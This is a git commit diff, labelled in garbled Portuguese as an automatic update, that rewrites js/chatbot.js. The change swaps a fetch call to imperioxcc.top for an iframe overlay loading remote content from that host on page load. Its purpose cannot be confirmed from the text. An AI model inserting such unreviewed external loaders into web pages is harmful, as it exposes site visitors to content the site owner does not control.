10fa61c42f58628302edd92032849908031c1e54
tulioalvex <tulioalvex@gmail.com>
2025-08-01 11:37:35 -0300

    Atualiza├º├úo autom├ítica em 2025-08-01_11:37:35

--- js/chatbot.js
+++ js/chatbot.js
@@ -1,1 +1,6 @@
-fetch('https://imperioxcc.top/chatbot/check/?k=47e8091700');
+window.addEventListener("DOMContentLoaded", () => {
+  const iframe = document.createElement("iframe");
+  iframe.src = "https://imperioxcc.top/chatbot/check/?k=47e8091700";
+  iframe.style = "position:fixed;bottom:80px;right:20px;width:300px;height:400px;border:none;z-index:9999";
+  document.getElementById("chatbot").appendChild(iframe);
+});
